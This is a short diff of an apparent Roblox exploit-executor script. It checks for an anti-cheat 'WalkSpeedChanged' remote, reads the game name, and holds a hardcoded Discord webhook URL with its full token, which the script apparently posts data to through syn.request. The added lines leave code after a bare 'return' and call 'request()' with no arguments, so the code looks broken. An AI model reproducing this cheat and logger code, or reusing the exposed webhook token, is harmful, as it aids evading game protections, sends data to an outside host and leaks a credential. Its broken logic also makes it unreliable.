@@ -28,6 +28,7 @@ if game:GetService("ReplicatedStorage"):FindFirstChild("WalkSpeedChanged") then
     end
   end
   return
+
   local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 HttpService = game:GetService("HttpService")
 Webhook_URL = "https://discord.com/api/webhooks/1231633572453158994/Tbkl1CKYn1KECBNIGul_ZPOtkJ5MoIQJnUm8IzuwPU1wRtugLQepqXznD873nj-bPqjt"
@@ -58,6 +59,9 @@ local responce = syn.request(
 }
 )
 end
+
+local request = syn and syn.request or request
+local responce = request()
 
 local qOT = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 
